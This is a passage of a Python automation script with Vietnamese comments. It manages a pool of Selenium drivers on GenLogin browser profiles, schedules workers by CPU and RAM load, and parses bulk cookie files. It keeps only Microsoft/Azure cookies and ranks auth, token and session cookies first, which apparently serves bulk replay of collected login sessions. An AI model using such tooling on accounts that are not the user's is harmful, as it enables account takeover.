                        close_current_driver(driver, gen, profile_id)
                        self.driver_counters["failed"] += 1
                        raise WebDriverPoolError("Không thể tạo driver mới với execution context ổn định")
                
                self.logger.info(f"Đã tạo driver mới cho profile {profile_id}")
                self.active_drivers += 1
                self.driver_counters["created"] += 1
                
                # Cập nhật thời gian kiểm tra execution context
                self.last_execution_context_check[profile_id] = time.time()
                
                return driver, gen, profile_id
            except Exception as e:
                self.logger.error(f"Không thể tạo driver mới: {type(e).__name__}: {str(e)}")
                self.driver_counters["failed"] += 1
                raise WebDriverPoolError(f"Không thể tạo driver mới: {str(e)}") from e

    @retry_with_backoff(max_retries=3, initial_delay=2, backoff_factor=2)
    def _create_new_driver(self) -> Tuple[webdriver.Chrome, Any, str]:
        """
        Tạo và khởi tạo driver mới với cơ chế retry mạnh mẽ.
        Cải tiến với kiểm tra execution context sau khi tạo.
        """
        # Kiểm tra cờ shutdown trước khi tạo driver mới
        if is_shutdown_requested() or self.shutdown_flag:
            raise WebDriverPoolError("Yêu cầu shutdown, không thể tạo driver mới")

        driver, gen, profile_id = init_driver_with_genlogin(
            chrome_driver_path=self.config.chrome_driver_path,
            profile_id=None,
            page_load_timeout=self.config.get_timeout("page_load", 30),
            max_retries=2,
            force_stop_running=self.config.force_stop_running
        )

        if not driver or not gen or not profile_id:
            self.logger.warning(
                f"Khởi tạo không đầy đủ: driver={bool(driver)}, gen={bool(gen)}, profile_id={bool(profile_id)}"
            )
            if driver or gen or profile_id:
                close_current_driver(driver, gen, profile_id)
            raise WebDriverPoolError("Khởi tạo driver không đầy đủ")

        # Kiểm tra kết nối cơ bản và window handles
        if not verify_driver_connection(driver):
            self.logger.warning("Driver mới không có kết nối hợp lệ")
            close_current_driver(driver, gen, profile_id)
            raise WebDriverPoolError("Driver mới không có kết nối hợp lệ")
            
        try:
            # Kiểm tra window handles
            if len(driver.window_handles) == 0:
                self.logger.warning("Driver mới không có window handles")
                close_current_driver(driver, gen, profile_id)
                raise WebDriverPoolError("Driver mới không có window handles")
        except Exception as e:
            self.logger.warning(f"Lỗi kiểm tra window handles cho driver mới: {str(e)}")
            try:
                close_current_driver(driver, gen, profile_id)
            except:
                pass
            raise WebDriverPoolError(f"Lỗi kiểm tra driver mới: {str(e)}")
            
        # Kiểm tra execution context bằng cách thử thực hiện một script đơn giản
        try:
            driver.execute_script("return navigator.userAgent")
        except Exception as e:
            self.logger.warning(f"Driver mới có lỗi execution context: {str(e)}")
            try:
                close_current_driver(driver, gen, profile_id)
            except:
                pass
            raise WebDriverPoolError(f"Driver mới có lỗi execution context: {str(e)}")

        # Thêm thời gian sleep ngắn để đảm bảo ChromeDriver đã ổn định
        time.sleep(0.5)
        
        # Kiểm tra lại execution context sau sleep
        try:
            result = driver.execute_script("return window.navigator.userAgent")
            if not result:
                self.logger.warning("Driver mới trả về userAgent rỗng")
                close_current_driver(driver, gen, profile_id)
                raise WebDriverPoolError("Driver mới không ổn định (userAgent rỗng)")
        except Exception as e:
            self.logger.warning(f"Driver mới không ổn định sau sleep: {str(e)}")
            try:
                close_current_driver(driver, gen, profile_id)
            except:
                pass
            raise WebDriverPoolError(f"Driver mới không ổn định sau sleep: {str(e)}")
            
        # Thử điều hướng đến about:blank - trang an toàn để kiểm tra
        try:
            driver.get("about:blank")
        except Exception as e:
            self.logger.warning(f"Driver mới không thể điều hướng đến about:blank: {str(e)}")
            try:
                close_current_driver(driver, gen, profile_id)
            except:
                pass
            raise WebDriverPoolError(f"Driver mới không thể điều hướng: {str(e)}")
            
        # Kiểm tra một lần nữa execution context sau navigation
        try:
            document_ready = driver.execute_script("return document.readyState")
            if document_ready not in ['interactive', 'complete']:
                self.logger.warning(f"Driver mới có readyState bất thường: {document_ready}")
                close_current_driver(driver, gen, profile_id)
                raise WebDriverPoolError(f"Driver mới có readyState bất thường: {document_ready}")
        except Exception as e:
            self.logger.warning(f"Driver mới không ổn định sau navigation: {str(e)}")
            try:
                close_current_driver(driver, gen, profile_id)
            except:
                pass
            raise WebDriverPoolError(f"Driver mới không ổn định sau navigation: {str(e)}")

        return driver, gen, profile_id

    def return_driver(self, driver, gen, profile_id, priority=0):
        """
        Trả driver về pool để tái sử dụng.
        Cải tiến với kiểm tra execution context kỹ lưỡng và phân loại health score.
        
        Args:
            priority: Mức độ ưu tiên cho lần sử dụng tiếp theo (cao hơn được xử lý trước)
        """
        with self.lock:
            self.active_drivers = max(0, self.active_drivers - 1)
            
            if self.shutdown_flag:
                self.logger.debug(f"Đóng driver cho profile {profile_id} do pool đang shutdown")
                close_current_driver(driver, gen, profile_id)
                self.driver_counters["closed"] += 1
                return

            # Kiểm tra execution context trước khi trả về pool
            # Nếu không còn execution context, đóng driver và không trả về pool
            if not self._check_execution_context(driver, profile_id):
                self.logger.warning(f"Driver {profile_id} có lỗi execution context, không trả về pool")
                close_current_driver(driver, gen, profile_id)
                self.driver_counters["closed"] += 1
                return
                
            # Kiểm tra sức khỏe tổng quát của driver
            health_result, health_score = self._check_driver_health(driver, profile_id)
            if not health_result:
                self.logger.warning(f"Driver {profile_id} không đủ khỏe (score: {health_score}), không trả về pool")
                close_current_driver(driver, gen, profile_id)
                self.driver_counters["closed"] += 1
                return

            if len(self.pool) < self.max_size:
                # Xóa cookie và dữ liệu trình duyệt trước khi trả về pool
                try:
                    if not self.shutdown_flag:
                        # Điều hướng về about:blank trước
                        try:
                            driver.get("about:blank")
                        except Exception as e:
                            self.logger.warning(f"Không thể điều hướng về about:blank: {str(e)}")
                            # Nếu lỗi execution context, không trả về pool
                            if "execution context" in str(e).lower():
                                close_current_driver(driver, gen, profile_id)
                                self.driver_counters["closed"] += 1
                                return
                                
                        # Kiểm tra lại execution context sau navigation
                        if not self._check_execution_context(driver, profile_id):
                            self.logger.warning(f"Driver {profile_id} mất execution context sau navigation, không trả về pool")
                            close_current_driver(driver, gen, profile_id)
                            self.driver_counters["closed"] += 1
                            return
                            
                        # Xóa dữ liệu browsing
                        try:
                            clear_browsing_data(driver, self.config.domain_url_map, multi_tab=True, verify_connection=True)
                        except Exception as e:
                            self.logger.warning(f"Lỗi xóa dữ liệu trình duyệt: {str(e)}")
                            # Nếu lỗi execution context, không trả về pool
                            if "execution context" in str(e).lower():
                                close_current_driver(driver, gen, profile_id)
                                self.driver_counters["closed"] += 1
                                return
                            
                        # Kiểm tra lại execution context sau clear browsing data
                        if not self._check_execution_context(driver, profile_id):
                            self.logger.warning(f"Driver {profile_id} mất execution context sau xóa dữ liệu, không trả về pool")
                            close_current_driver(driver, gen, profile_id)
                            self.driver_counters["closed"] += 1
                            return
                        
                except Exception as e:
                    self.logger.warning(f"Lỗi xóa dữ liệu trình duyệt: {str(e)}. Đóng driver")
                    close_current_driver(driver, gen, profile_id)
                    self.driver_counters["closed"] += 1
                    return
                    
                # Nếu driver quá cũ, đánh dấu ưu tiên thấp hơn
                current_age = time.time() - self.last_execution_context_check.get(profile_id, 0)
                if current_age > self.max_driver_age:
                    priority = max(priority - 10, -10)  # Giảm priority nhưng giữ giới hạn -10
                    health_score = max(health_score - 20, 50)  # Giảm health score cho driver cũ
                    self.logger.debug(f"Driver {profile_id} quá cũ ({current_age/3600:.1f}h), giảm priority và health score")
                
                # Thêm driver vào pool với health score đã cập nhật
                self.pool.append((driver, gen, profile_id, time.time(), priority, health_score))
                self.logger.debug(f"Đã trả driver cho profile {profile_id} về pool (health: {health_score})")
            else:
                self.logger.debug(f"Pool đầy, đóng driver cho profile {profile_id}")
                close_current_driver(driver, gen, profile_id)
                self.driver_counters["closed"] += 1

    def get_metrics(self) -> Dict[str, Any]:
        """Lấy thông tin metric chi tiết của WebDriverPool"""
        with self.lock:
            execution_context_errors_detail = {
                k: v for k, v in self.error_history["execution_context"].items() 
                if v > 0
            }
            
            # Tính % tỷ lệ thành công/thất bại
            total_operations = (self.driver_counters["created"] + 
                               self.driver_counters["reused"] + 
                               self.driver_counters["failed"] + 
                               self.driver_counters["closed"])
            
            success_rate = 0
            if total_operations > 0:
                success_rate = ((self.driver_counters["created"] + self.driver_counters["reused"]) / 
                               total_operations) * 100
                
            return {
                "active_drivers": self.active_drivers,
                "pool_size": len(self.pool),
                "pool_health": [health for _, _, _, _, _, health in self.pool],
                "total_created": self.driver_counters["created"],
                "total_reused": self.driver_counters["reused"],
                "total_failed": self.driver_counters["failed"],
                "total_closed": self.driver_counters["closed"],
                "execution_context_errors": self.driver_counters["execution_context_errors"],
                "recovered": self.driver_counters["recovered"],
                "success_rate": success_rate,
                "error_history": {
                    "execution_context_count": sum(self.error_history["execution_context"].values()),
                    "no_such_window_count": sum(self.error_history["no_such_window"].values()),
                    "connection_errors_count": sum(self.error_history["connection_errors"].values()),
                    "other_errors_count": sum(self.error_history["other_errors"].values())
                },
                "execution_context_errors_detail": execution_context_errors_detail,
                "history": self.health_metrics[-10:] if self.health_metrics else []
            }

    def shutdown(self):
        """Đóng tất cả driver trong pool với cơ chế an toàn hơn."""
        self.logger.info("Đang shutdown WebDriver Pool")
        self.shutdown_flag = True

        # Đóng tất cả driver đang hoạt động
        with self.lock:
            for driver, gen, profile_id, _, _, _ in self.pool:
                try:
                    self.logger.debug(f"Đóng driver cho profile {profile_id}")
                    
                    # Sử dụng kỹ thuật đóng timeout thấp
                    try:
                        driver.set_page_load_timeout(1)
                        driver.set_script_timeout(1)
                    except:
                        pass
                    
                    # Thoát ra khỏi các trang hiện tại
                    try:
                        # Đây là trang nhẹ để đảm bảo không phải đợi load
                        driver.get("about:blank")
                    except:
                        pass
                        
                    # Đóng driver
                    close_current_driver(driver, gen, profile_id, force_quit=True)
                except Exception as e:
                    self.logger.warning(f"Lỗi đóng driver: {str(e)}")
            
            # Xóa toàn bộ pool
            self.pool = []
            
            # Xóa các cờ và dữ liệu cache
            self.last_execution_context_check = {}
            
        self.logger.info("Đã đóng tất cả driver trong pool")
        
        # Đợi health check loop kết thúc
        if hasattr(self, 'health_thread') and self.health_thread.is_alive():
            self.logger.debug("Đợi health check thread kết thúc...")
            try:
                self.health_thread.join(timeout=2)
            except:
                pass
            self.logger.debug("Health check thread đã kết thúc")

# --- CookieProcessor ---
class CookieProcessor:
    """
    Xử lý cookie với các tối ưu hiệu suất:
    - Streaming parser cho file lớn
    - Kiểm tra nhanh để bỏ qua file không hợp lệ
    - Ưu tiên cookie theo domain
    - Cache kết quả đã xử lý để tái sử dụng
    """
    def __init__(
        self,
        domain_url_map: Dict[str, str],
        logger: Optional[logging.Logger] = None,
        cache_size: int = 100
    ):
        self.domain_url_map = domain_url_map
        self.logger = logger or logging.getLogger(__name__)
        self.cache = {}  # {file_path: (timestamp, result)}
        self.cache_size = cache_size
        self.cache_lock = threading.RLock()

        # Microsoft/Azure domain patterns
        self.ms_domain_patterns = [
            r'\.microsoft\.com$',
            r'\.azure\.com$',
            r'\.office\.com$',
            r'\.live\.com$',
            r'\.microsoftonline\.com$',
            r'\.sharepoint\.com$'
        ]

    def quick_check(self, file_path: str) -> bool:
        """
        Kiểm tra nhanh xem file có phải cookie Microsoft/Azure hợp lệ không.
        Giúp bỏ qua sớm các file không hợp lệ để tăng hiệu suất.
        """
        try:
            file_path = Path(file_path)

            # Kiểm tra kích thước file
            file_size = file_path.stat().st_size
            if file_size == 0:
                self.logger.warning(f"File trống: {file_path}")
                return False

            if file_size > 10 * 1024 * 1024:
                self.logger.warning(f"File quá lớn (>10MB): {file_path}")
                return False

            content_check_size = min(file_size, 8192)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                sample = f.read(content_check_size)

                if not ('{"' in sample or '[\n' in sample or '[{' in sample):
                    if not ('domain' in sample.lower() and 'value' in sample.lower()):
                        self.logger.warning(f"File không có định dạng cookie JSON: {file_path}")
                        return False

                ms_domains_found = False
                for pattern in self.ms_domain_patterns:
                    if re.search(pattern, sample, re.IGNORECASE):
                        ms_domains_found = True
                        break

                if not ms_domains_found:
                    self.logger.warning(f"Không tìm thấy domain Microsoft/Azure: {file_path}")
                    return False

            return True
        except Exception as e:
            self.logger.error(f"Lỗi kiểm tra nhanh {file_path}: {type(e).__name__}: {str(e)}")
            return False

    def process_file(self, file_path: str) -> Dict[str, List[Dict]]:
        """
        Xử lý file cookie và trả về Dict[domain, List[cookie]].
        Hỗ trợ caching để tái sử dụng kết quả.
        """
        file_path_str = str(file_path)
        
        # Kiểm tra cache
        with self.cache_lock:
            if file_path_str in self.cache:
                timestamp, result = self.cache[file_path_str]
                file_mtime = Path(file_path).stat().st_mtime
                # Nếu file không thay đổi kể từ lần xử lý cuối, trả về kết quả cached
                if file_mtime <= timestamp:
                    self.logger.debug(f"Sử dụng kết quả cache cho {file_path}")
                    return result
        
        file_path = Path(file_path)
        file_size = file_path.stat().st_size

        try:
            if file_size > 1024 * 1024:
                self.logger.debug(f"Dùng streaming parser cho file lớn: {file_path} ({file_size/1024/1024:.2f}MB)")
                result = self._process_large_file(file_path)
            else:
                cookies = parse_cookie_file(str(file_path))
                result = self._group_and_prioritize_cookies(cookies)
                
            # Lưu vào cache
            with self.cache_lock:
                # Giới hạn kích thước cache
                if len(self.cache) >= self.cache_size:
                    # Xóa entry cũ nhất
                    oldest_key = min(self.cache.keys(), key=lambda k: self.cache[k][0])
                    del self.cache[oldest_key]
                self.cache[file_path_str] = (time.time(), result)
                
            return result
        except Exception as e:
            self.logger.error(f"Lỗi xử lý file cookie {file_path}: {type(e).__name__}: {str(e)}")
            return {}

    def _process_large_file(self, file_path: Path) -> Dict[str, List[Dict]]:
        """Xử lý file cookie lớn với streaming."""
        try:
            if file_path.suffix.lower() == '.json':
                return self._process_large_json_file(file_path)
            else:
                return self._process_large_text_file(file_path)
        except Exception as e:
            self.logger.error(f"Lỗi xử lý file lớn {file_path}: {type(e).__name__}: {str(e)}")
            return {}

    def _process_large_json_file(self, file_path: Path) -> Dict[str, List[Dict]]:
        """Xử lý file JSON lớn bằng streaming parser."""
        import json
        all_cookies = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            first_char = f.read(1).strip()
            f.seek(0)
            if first_char == '[':
                try:
                    # Thử dùng ijson nếu có
                    try:
                        import ijson
                        parser = ijson.items(f, 'item')
                        for cookie in parser:
                            if isinstance(cookie, dict) and 'domain' in cookie:
                                all_cookies.append(cookie)
                    except ImportError:
                        data = json.load(f)
                        if isinstance(data, list):
                            for cookie in data:
                                if isinstance(cookie, dict) and 'domain' in cookie:
                                    all_cookies.append(cookie)
                except Exception as e:
                    # Fallback to standard JSON parser
                    self.logger.warning(f"Lỗi với ijson, fallback to standard parser: {str(e)}")
                    f.seek(0)
                    data = json.load(f)
                    if isinstance(data, list):
                        for cookie in data:
                            if isinstance(cookie, dict) and 'domain' in cookie:
                                all_cookies.append(cookie)
            elif first_char == '{':
                data = json.load(f)
                if isinstance(data, dict):
                    if 'domain' in data:
                        all_cookies.append(data)
                    elif 'cookies' in data and isinstance(data['cookies'], list):
                        all_cookies.extend(data['cookies'])
        return self._group_and_prioritize_cookies(all_cookies)

    def _process_large_text_file(self, file_path: Path) -> Dict[str, List[Dict]]:
        """Xử lý file văn bản lớn theo từng dòng."""
        all_cookies = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if not line.strip() or line.startswith('#'):
                    continue
                parts = line.split('\t')
                if len(parts) >= 7:
                    try:
                        cookie = {
                            'domain': parts[0],
                            'path': parts[2] if parts[2] else "/",
                            'secure': parts[3].lower() == 'true',
                            'expiry': int(parts[4]) if parts[4].isdigit() else None,
                            'name': parts[5],
                            'value': parts[6]
                        }
                        all_cookies.append(cookie)
                    except (IndexError, ValueError):
                        pass
        return self._group_and_prioritize_cookies(all_cookies)

    def _group_and_prioritize_cookies(self, cookies: List[Dict]) -> Dict[str, List[Dict]]:
        """
        Gom nhóm cookie theo domain và sắp xếp theo mức độ ưu tiên.
        
        Sắp xếp cookie trong mỗi domain theo mức độ quan trọng:
        - Cookie có expiry cao hơn đặt sau
        - Cookie auth/session có mức ưu tiên cao hơn
        """
        cookies_by_domain = group_cookies_by_domain(cookies, self.domain_url_map)
        prioritized = {}
        
        # Ưu tiên các domain trong domain_url_map
        for domain in self.domain_url_map:
            if domain in cookies_by_domain:
                # Sắp xếp cookie trong domain theo mức độ ưu tiên
                domain_cookies = cookies_by_domain[domain]
                # Hàm tính điểm cho cookie
                def score_cookie(cookie: Dict) -> float:
                    score = 0.0
                    name = cookie.get('name', '').lower()
                    
                    # Cookie auth có điểm cao
                    auth_terms = ['auth', 'token', 'session', 'signin', 'login', 'credential', 'access', '.auth', 'jwt']
                    for term in auth_terms:
                        if term in name:
                            score += 10.0
                            break
                            
                    # Cookie không có expiry hoặc expiry cao được ưu tiên
                    if 'expiry' not in cookie:
                        score += 5.0
                    else:
                        # Expiry trong tương lai gần có điểm thấp hơn
                        now = time.time()
                        expiry = cookie.get('expiry', 0)
                        if expiry > now:
                            time_left = expiry - now
                            # Còn trên 30 ngày thì điểm cao hơn
                            if time_left > 30 * 86400:
                                score += 3.0
                    
                    # Cookie httpOnly và secure có điểm cao hơn
                    if cookie.get('httpOnly', False):
                        score += 2.0
                    if cookie.get('secure', False):
                        score += 1.0
                        
                    return score
                
                # Sắp xếp theo điểm, cao đến thấp
                prioritized[domain] = sorted(domain_cookies, key=score_cookie, reverse=True)
                del cookies_by_domain[domain]
                
        # Thêm các domain còn lại
        for domain, domain_cookies in cookies_by_domain.items():
            prioritized[domain] = domain_cookies
            
        return prioritized

    def clear_cache(self):
        """Xóa toàn bộ cache"""
        with self.cache_lock:
            self.cache.clear()
            self.logger.debug("Đã xóa cache CookieProcessor")

# --- AdaptiveTaskScheduler ---
class AdaptiveTaskScheduler:
    """
    Quản lý công việc với tự động điều chỉnh số lượng worker:
    - Giám sát tài nguyên hệ thống (CPU/RAM)
    - Tự động điều chỉnh số worker phù hợp
    - Theo dõi hiệu suất để tối ưu
    - Lập lịch thông minh dựa trên mức độ ưu tiên và tài nguyên
    """
    def __init__(
        self,
        max_workers: int = None,
        max_cpu_percent: int = 70,
        max_memory_percent: int = 80,
        check_interval: int = 15,
        logger: Optional[logging.Logger] = None
    ):
        self.max_workers = max_workers or min(os.cpu_count() or 2, 4)
        self.max_cpu_percent = max_cpu_percent
        self.max_memory_percent = max_memory_percent
        self.check_interval = check_interval
        self.logger = logger or logging.getLogger(__name__)
        self.current_workers = self.max_workers
        self.last_check_time = time.time()
        self.resource_lock = threading.RLock()
        self.task_times = {}  # {task_id: {'start': time, 'end': time, 'success': bool}}
        self.task_success = {}  # {task_id: bool}
        self.system_metrics = []  # [{timestamp, cpu, memory, workers}, ...]
        self.shutdown_flag = False
        self.monitor_thread = threading.Thread(target=self._monitor_resources, daemon=True)
        self.monitor_thread.start()
        self.task_queue = []  # [(priority, task_id, callback), ...]
        self.task_queue_lock = threading.RLock()
        self.performance_history = []  # [{timestamp, avg_time, success_rate, cpu, memory}, ...]
        
        # Machine learning state (simple)
        self.learning_data = []
        self.predictor_trained = False

    def _monitor_resources(self):
        """Thread giám sát tài nguyên hệ thống và tự động điều chỉnh workers"""
        while not self.shutdown_flag:
            try:
                current_time = time.time()
                if current_time - self.last_check_time >= self.check_interval:
                    self._adjust_worker_count()
                    self._update_performance_history()
                    self.last_check_time = current_time
                    
                    # Sau mỗi 10 lần kiểm tra, cập nhật model dự đoán
                    if len(self.performance_history) % 10 == 0 and len(self.performance_history) >= 20:
                        self._update_prediction_model()
            except Exception as e:
                self.logger.error(f"Lỗi giám sát tài nguyên: {type(e).__name__}: {str(e)}")
            time.sleep(5)

    def _adjust_worker_count(self):
        """Tự động điều chỉnh số worker dựa trên tài nguyên và hiệu suất"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory_percent = psutil.virtual_memory().percent
            
            # Lưu metrics
            self.system_metrics.append({
                'timestamp': time.time(),
                'cpu': cpu_percent,
                'memory': memory_percent,
                'workers': self.current_workers
            })
            if len(self.system_metrics) > 20:
                self.system_metrics = self.system_metrics[-20:]
                
            # Sử dụng model dự đoán nếu đã được training
            if self.predictor_trained and len(self.learning_data) >= 10:
                predicted_workers = self._predict_optimal_workers(cpu_percent, memory_percent)
                if predicted_workers is not None:
                    with self.resource_lock:
                        old_workers = self.current_workers
                        self.current_workers = max(1, min(self.max_workers, predicted_workers))
                        if old_workers != self.current_workers:
                            self.logger.info(
                                f"[ML] Điều chỉnh số worker: {old_workers} -> {self.current_workers} "
                                f"(CPU: {cpu_percent:.1f}%, RAM: {memory_percent:.1f}%)"
                            )
                    return
                    
            # Nếu không có model dự đoán, sử dụng logic cơ bản
            with self.resource_lock:
                old_workers = self.current_workers
                if cpu_percent > self.max_cpu_percent or memory_percent > self.max_memory_percent:
                    # Giảm workers nếu tài nguyên quá tải
                    self.current_workers = max(1, int(self.current_workers * 0.75))
                elif cpu_percent < self.max_cpu_percent * 0.7 and memory_percent < self.max_memory_percent * 0.7:
                    # Tăng workers nếu tài nguyên dư thừa
                    self.current_workers = min(self.max_workers, self.current_workers + 1)
                if old_workers != self.current_workers:
                    self.logger.info(
                        f"Đã điều chỉnh số worker: {old_workers} -> {self.current_workers} "
                        f"(CPU: {cpu_percent:.1f}%, RAM: {memory_percent:.1f}%)"
                    )
        except Exception as e:
            self.logger.error(f"Lỗi điều chỉnh worker: {type(e).__name__}: {str(e)}")

    def _update_performance_history(self):
        """Cập nhật lịch sử hiệu suất"""
        try:
            # Chỉ tính trên các task đã hoàn thành
            completed_tasks = [
                task for task_id, task in self.task_times.items() 
                if 'end' in task and 'start' in task
            ]
            
            if completed_tasks:
                avg_time = sum(task['end'] - task['start'] for task in completed_tasks) / len(completed_tasks)
                success_tasks = sum(1 for task_id, success in self.task_success.items() if success)
                success_rate = success_tasks / len(self.task_success) if self.task_success else 0
                
                current_metrics = self.system_metrics[-1] if self.system_metrics else {'cpu': 0, 'memory': 0}
                
                self.performance_history.append({
                    'timestamp': time.time(),
                    'avg_time': avg_time,
                    'success_rate': success_rate,
                    'workers': self.current_workers,
                    'cpu': current_metrics.get('cpu', 0),
                    'memory': current_metrics.get('memory', 0)
                })
                
                # Giới hạn lịch sử
                if len(self.performance_history) > 100:
                    self.performance_history = self.performance_history[-100:]
                    
                # Lưu dữ liệu cho machine learning
                self.learning_data.append({
                    'workers': self.current_workers,
                    'cpu': current_metrics.get('cpu', 0),
                    'memory': current_metrics.get('memory', 0),
                    'avg_time': avg_time,
                    'success_rate': success_rate
                })
                
                # Reset task counters sau khi đã lưu dữ liệu
                if len(self.task_times) > 1000:
                    self.task_times.clear()
                    self.task_success.clear()
        except Exception as e:
            self.logger.error(f"Lỗi cập nhật lịch sử hiệu suất: {str(e)}")

    def _update_prediction_model(self):
        """
        Cập nhật model dự đoán số worker tối ưu dựa trên dữ liệu hiệu suất.
        Model sử dụng phương pháp bucketing để gom nhóm các cấu hình tài nguyên
        tương tự nhau, sau đó tìm số lượng worker tối ưu cho mỗi nhóm.
        """
        try:
            # Chỉ thực hiện khi có đủ dữ liệu
            if len(self.learning_data) < 20:
                self.logger.debug("Chưa đủ dữ liệu để cập nhật model dự đoán")
                return
                    
            # Đơn giản hóa: Tìm số worker tối ưu dựa trên hiệu suất cao nhất cho từng level tài nguyên
            # Chia tài nguyên thành các bucket
            resource_buckets = {}
            
            for entry in self.learning_data:
                # Kiểm tra dữ liệu hợp lệ
                if not all(k in entry for k in ['cpu', 'memory', 'avg_time', 'workers', 'success_rate']):
                    continue
                    
                # Lấy bucket dựa trên CPU và RAM (chia thành lưới 10x10)
                try:
                    cpu_bucket = min(9, int(entry['cpu'] / 10))
                    mem_bucket = min(9, int(entry['memory'] / 10))
                    bucket_key = f"{cpu_bucket}_{mem_bucket}"
                except (TypeError, ValueError):
                    # Bỏ qua entry có dữ liệu không hợp lệ
                    continue
                    
                if bucket_key not in resource_buckets:
                    resource_buckets[bucket_key] = []
                        
                # Tính điểm hiệu suất (trọng số: thời gian 70%, success rate 30%)
                try:
                    # Thời gian thấp -> điểm cao
                    if entry['avg_time'] > 0:
                        time_score = 1.0 / entry['avg_time']
                    else:
                        time_score = 10  # Giá trị cao nếu thời gian gần 0
                        
                    success_score = entry['success_rate']
                    perf_score = 0.7 * time_score + 0.3 * success_score
                    
                    resource_buckets[bucket_key].append({
                        'workers': entry['workers'],
                        'score': perf_score
                    })
                except (TypeError, ValueError, ZeroDivisionError):
                    # Bỏ qua các lỗi tính toán
                    continue
            
            if not resource_buckets:
                self.logger.warning("Không có dữ liệu hợp lệ để cập nhật model dự đoán")
                return
                
            # Tìm số worker tối ưu cho mỗi bucket
            self.optimal_workers_map = {}
            for bucket_key, entries in resource_buckets.items():
                if not entries:
                    continue
                        
                # Group by worker count và tính điểm trung bình
                worker_scores = defaultdict(list)
                for entry in entries:
                    if not isinstance(entry['workers'], (int, float)) or entry['workers'] <= 0:
                        continue
                    worker_scores[entry['workers']].append(entry['score'])
                    
                # Kiểm tra worker_scores có dữ liệu không
                if not worker_scores:
                    self.logger.debug(f"Không có dữ liệu worker hợp lệ cho bucket {bucket_key}")
                    continue
                    
                # Tính điểm trung bình cho mỗi số lượng worker
                avg_scores = {w: sum(scores)/len(scores) for w, scores in worker_scores.items()}
                
                # LỖI Ở ĐÂY: Kiểm tra avg_scores có dữ liệu không trước khi gọi max()
                if not avg_scores:
                    self.logger.debug(f"Không có điểm trung bình cho bucket {bucket_key}")
                    continue
                    
                # Chọn số worker có điểm cao nhất
                try:
                    best_worker_count = max(avg_scores.items(), key=lambda x: x[1])[0]
                    self.optimal_workers_map[bucket_key] = best_worker_count
                except ValueError as e:
                    self.logger.warning(f"Không thể tìm worker tối ưu cho bucket {bucket_key}: {str(e)}")
            
            # Kiểm tra xem có update được không
            if not self.optimal_workers_map:
                self.logger.warning("Không thể cập nhật model dự đoán - không có bucket nào có dữ liệu hợp lệ")
                return
                
            self.predictor_trained = True
            self.logger.info(f"Đã cập nhật model dự đoán với {len(self.optimal_workers_map)} bucket tài nguyên")
            
        except Exception as e:
            self.logger.error(f"Lỗi cập nhật model dự đoán: {str(e)}")
            # Không đặt predictor_trained = False ở đây để tránh mất dữ liệu từ lần update trước
        
    def _predict_optimal_workers(self, cpu_percent, memory_percent) -> Optional[int]:
        """Dự đoán số worker tối ưu dựa trên tài nguyên hiện tại"""
        try:
            if not self.predictor_trained or not self.optimal_workers_map:
                return None
                
            # Lấy bucket tương ứng với mức tài nguyên hiện tại
            cpu_bucket = min(9, int(cpu_percent / 10))
            mem_bucket = min(9, int(memory_percent / 10))
            bucket_key = f"{cpu_bucket}_{mem_bucket}"
            
            # Nếu không có dữ liệu cho bucket này, thử tìm bucket gần nhất
            if bucket_key not in self.optimal_workers_map:
                # Tìm bucket gần nhất (khoảng cách Manhattan nhỏ nhất)
                nearest_bucket = None
                min_distance = float('inf')
                
                for existing_bucket in self.optimal_workers_map.keys():
                    # Parse bucket
                    try:
                        ex_cpu, ex_mem = map(int, existing_bucket.split('_'))
                        distance = abs(ex_cpu - cpu_bucket) + abs(ex_mem - mem_bucket)
                        
                        if distance < min_distance:
                            min_distance = distance
                            nearest_bucket = existing_bucket
                    except Exception:
                        continue
                
                if nearest_bucket and min_distance <= 3:  # Chỉ sử dụng nếu gần
                    bucket_key = nearest_bucket
                else:
                    return None
            
            # Lấy giá trị dự đoán
            return self.optimal_workers_map.get(bucket_key)
        except Exception as e:
            self.logger.error(f"Lỗi dự đoán workers: {str(e)}")
            return None

    def get_optimal_workers(self) -> int:
        """Lấy số lượng worker tối ưu hiện tại"""
        with self.resource_lock:
            return self.current_workers

    def record_task_start(self, task_id):
        """Ghi nhận thời điểm bắt đầu task"""
        self.task_times[task_id] = {'start': time.time()}

    def record_task_complete(self, task_id, success=True):
        """Ghi nhận thời điểm hoàn thành và kết quả task"""
        if task_id in self.task_times:
            self.task_times[task_id]['end'] = time.time()
            self.task_success[task_id] = success

    def add_task(self, task_id, callback, priority=0):
        """Thêm task vào hàng đợi ưu tiên"""
        with self.task_queue_lock:
            # Thêm task vào queue với priority
            self.task_queue.append((priority, task_id, callback))
            # Sắp xếp theo priority (cao đến thấp)
            self.task_queue.sort(key=lambda x: x[0], reverse=True)

    def get_next_task(self) -> Optional[Tuple[str, Callable]]:
        """Lấy task tiếp theo từ hàng đợi"""
        with self.task_queue_lock:
            if not self.task_queue:
                return None
            _, task_id, callback = self.task_queue.pop(0)
            return task_id, callback

    def get_performance_report(self) -> Dict:
        """Lấy báo cáo hiệu suất chi tiết"""
        completed_tasks = [t for t in self.task_times.values() if 'end' in t]
        if not completed_tasks:
            return {
                'tasks_completed': 0,
                'avg_task_time': 0,
                'success_rate': 0,
                'current_workers': self.current_workers,
                'memory_usage': psutil.virtual_memory().percent,
                'cpu_usage': psutil.cpu_percent(interval=0.1)
            }
            
        task_durations = [(t['end'] - t['start']) for t in completed_tasks]
        success_count = sum(1 for s in self.task_success.values() if s)
        
        # Tính toán sự ổn định (độ lệch chuẩn chuẩn hóa)
        if len(task_durations) > 1:
            import statistics
            mean_time = statistics.mean(task_durations)
            stdev_time = statistics.stdev(task_durations)
            # Hệ số biến thiên (CV): stdev/mean
            cv = stdev_time / mean_time if mean_time > 0 else 0
            stability = max(0, 1 - min(1, cv))  # 0 = không ổn định, 1 = rất ổn định
        else:
            stability = 1.0
            
        # Tính tốc độ xử lý (tasks/min)
        oldest_task = min((t['start'] for t in completed_tasks), default=time.time())
        newest_task = max((t['end'] for t in completed_tasks), default=time.time())
        time_span = max(0.001, newest_task - oldest_task)
        processing_rate = len(completed_tasks) / (time_span / 60)  # tasks/min
        
        return {
            'tasks_completed': len(completed_tasks),
            'avg_task_time': sum(task_durations) / len(task_durations) if task_durations else 0,
            'min_task_time': min(task_durations) if task_durations else 0,
            'max_task_time': max(task_durations) if task_durations else 0,
